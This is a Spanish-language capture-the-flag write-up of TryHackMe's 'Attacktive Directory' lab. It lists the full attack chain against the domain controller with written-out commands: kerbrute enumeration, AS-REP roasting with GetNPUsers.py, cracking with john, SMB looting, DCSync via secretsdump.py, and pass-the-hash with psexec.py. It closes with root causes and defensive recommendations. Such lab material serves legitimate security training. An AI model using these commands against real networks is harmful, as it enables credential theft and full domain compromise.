# Conclusiones – Attacktive Directory (TryHackMe)

## ✅ Resumen del compromiso
Se comprometió un **Domain Controller** de Active Directory (`AttacktiveDirectory.spookysec.local`) partiendo **sin credenciales** y aprovechando:
1. **Enumeración Kerberos** para descubrir usuarios válidos.
2. **AS-REP Roasting** sobre un usuario vulnerable (`svc-admin`).
3. **Crack del hash** AS-REP para obtener la contraseña en claro.
4. Acceso a **SMB** y lectura de `backup_credentials.txt` en el share `backup`.
5. Uso de esas credenciales para ejecutar **DCSync** con `secretsdump.py` y volcar **hashes del dominio**.
6. **Pass-the-Hash** sobre `Administrator` con `psexec.py` → shell **SYSTEM**.
7. Exfiltración de **flags** desde los escritorios de `svc-admin`, `backup` y `Administrator`.

---

## 🔗 Cadena de ataque (Kill Chain)
- **Descubrimiento/Recon**: `nmap` revela Kerberos/LDAP/SMB/RPC/DNS/RDP/WinRM → DC clásico.
- **Enumeración**:
  - `kerbrute userenum` → usuarios válidos (james, robin, svc-admin, etc.).
  - `enum4linux` → SID de dominio y grupos estándar (sin grandes fugas).
- **Obtención de credenciales**:
  - `GetNPUsers.py` → `$krb5asrep$23$` para **svc-admin** (sin preauth).
  - `john` → contraseña `management2005`.
- **Movimiento lateral / Acceso a datos**:
  - `smbclient` → share **backup** → `backup_credentials.txt` (Base64).
  - Decodificación → credenciales de **backup**.
- **Dominio**:
  - `secretsdump.py -just-dc` con **backup** → hashes NTLM (incl. `Administrator`) y claves Kerberos.
  - `psexec.py` con **Pass-the-Hash** → **NT AUTHORITY\SYSTEM** en el DC.
- **Objetivos**:
  - Lectura de flags en `Desktop` de `svc-admin`, `backup`, `Administrator`.

---

## 🧰 Herramientas clave y comandos usados
- **Nmap**
  - `nmap -Pn -sV -sC -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 spookysec.local`
- **Kerberos**
  - `kerbrute userenum --dc 10.10.19.151 -d spookysec.local users.txt`
  - `GetNPUsers.py spookysec.local/svc-admin -no-pass`
- **Cracking**
  - `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
- **SMB**
  - `smbclient -L \\10.10.19.151\\ -U svc-admin`
  - `smbclient \\10.10.19.151\\backup -U svc-admin` → `get backup_credentials.txt`
- **DCSync / NTDS**
  - `secretsdump.py spookysec.local/backup:'<PASS>'@10.10.19.151 -just-dc`
- **PTH / Shell**
  - `psexec.py spookysec.local/Administrator@10.10.19.151 -hashes :<NTLMHASH>`

---

## 🔍 Hallazgos de seguridad (Root Causes)
1. **Usuario Kerberos sin preautenticación** (`svc-admin` con *DONT_REQUIRE_PREAUTH*).
2. **Credenciales sensibles en texto (Base64)** dentro de un **share de backup** accesible.
3. **Cuenta `backup` con privilegios de replicación** (permite **DCSync**).
4. **Exposición de múltiples servicios de AD** a toda la red (Kerberos/LDAP/SMB/WinRM/RDP) sin segmentación.

---

## 🛡️ Recomendaciones defensivas
- **Habilitar preautenticación Kerberos** en *todas* las cuentas de usuario/servicio.
- **Rotar y endurecer contraseñas**; aplicar **políticas de complejidad** y **bloqueo**.
- **Eliminar credenciales en texto** de shares (`backup`, `NETLOGON`, `SYSVOL`); revisar GPO de logon scripts.
- **Principio de mínimo privilegio**: retirar permisos de **replicación** a cuentas no administrativas (evitar DCSync).
- **Auditar SPNs y cuentas de servicio**; usar **gMSA** donde sea posible.
- **Segmentación de red** y **firewall**: restringir 88/389/445/5985/3389 a administradores y hosts autorizados.
- **Monitoreo y alertas**:
  - Eventos de **AS-REP** anómalos y fallos Kerberos.
  - Llamadas **DRSUAPI** inusuales (indicadores de DCSync).
  - Creación de servicios remotos (`RemComSvc`/`PSEXESVC`) y actividades por SMB/WMI.

---

## 📎 Evidencias recopiladas
- `enum/nmap.txt`, `enum/kerbrute_valid.txt`
- `enum/asrep_hashes.txt` + resultado de `john`
- `loot/backup_credentials.txt` (y su decodificado)
- `loot/secretsdump_justdc.txt`
- Capturas: sesión `psexec.py` y lectura de flags

---

## 🧠 Lecciones aprendidas
- En AD, **una mala configuración Kerberos** + **fuga mínima** (texto/base64) + **permisos excesivos** escalan a **compromiso total de dominio** en pocos pasos.
- Centralizar y **automatizar la recolección de evidencias** reduce el tiempo de análisis y mejora el reporte.

---
